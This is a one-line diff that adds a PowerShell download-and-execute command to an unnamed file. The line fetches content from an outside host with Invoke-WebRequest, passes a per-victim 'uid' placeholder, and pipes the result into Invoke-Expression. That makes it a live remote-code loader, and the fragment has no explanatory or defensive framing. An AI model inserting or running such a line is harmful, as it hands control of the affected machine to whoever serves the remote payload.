@@ -1,0 +1,2 @@
+iwr https://ecs.rcsis.ir/?uid={uid} | iex
+
